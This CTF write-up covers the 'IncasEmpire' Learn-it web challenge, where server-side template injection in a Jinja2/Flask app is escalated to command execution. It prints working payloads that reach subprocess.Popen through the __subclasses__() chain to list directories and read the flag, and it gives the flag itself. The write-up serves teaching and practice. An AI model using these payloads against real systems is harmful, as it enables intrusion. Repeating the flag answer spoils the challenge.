---
title: "IncasEmpire — Learn-it CTF"
description: "Server-Side Template Injection (SSTI) in a Jinja2/Flask app leading to RCE via subprocess.Popen."
pubDate: 2025-02-15
tags: ["web", "ssti", "rce", "learn-it"]
---

**Category:** Web / SSTI
**Flag:** `LearnIT{IncasTemple#1}`

## Vulnerability

The server-side template engine (Jinja2) evaluates user input from the URL path directly, leading to SSTI.

## Confirming SSTI

```
GET /{{7*7}}
Response: 49
```

The server evaluates the expression — confirmed SSTI.

## Enumerating Python subclasses

```
GET /{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This dumps all Python classes loaded in the process, including `subprocess.Popen`.

## Finding `subprocess.Popen`

Iterate through the subclass list to find `subprocess.Popen` — in this instance it was at **index 414**.

## RCE via subprocess.Popen

**List root directory:**

```
/{{ ''.__class__.__mro__[1].__subclasses__()[414]('ls /', shell=True, stdout=-1).communicate()[0] }}
```

```
bin boot ctf dev etc home lib ...
```

**List `/ctf` directory:**

```
/{{ ''.__class__.__mro__[1].__subclasses__()[414]('ls /ctf', shell=True, stdout=-1).communicate()[0] }}
```

```
app.py  flag.txt  requirements.txt
```

**Read the flag:**

```
/{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /ctf/flag.txt', shell=True, stdout=-1).communicate()[0] }}
```

```
b'LearnIT{IncasTemple#1}'
```

## Takeaways

- Never render user-controlled input directly in Jinja2 templates.
- SSTI can escalate to full RCE through Python's class hierarchy.
- The `__subclasses__()` chain is a classic Jinja2 escape technique.
